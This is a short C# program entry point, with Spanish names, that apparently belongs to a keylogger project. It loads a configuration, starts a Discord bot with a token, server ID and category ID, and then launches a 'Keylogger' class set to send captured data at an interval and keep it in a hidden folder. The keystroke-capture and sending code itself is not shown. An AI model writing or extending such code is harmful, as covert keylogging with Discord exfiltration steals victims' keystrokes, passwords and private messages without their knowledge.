using System;
using System.Threading.Tasks;

public class Program
{
    public static async Task Main(string[] args)
    {
        var configuracion = Configuracion.CargarConfiguracion();

        var bot = new BotDiscord(configuracion.TokenDiscord, configuracion.IdServidor, configuracion.IdCategoria);
        await bot.IniciarAsync();

        var keylogger = new Keylogger(configuracion.IntervaloEnvio, configuracion.RutaCarpetaOculta);
        await keylogger.IniciarAsync();
    }
}
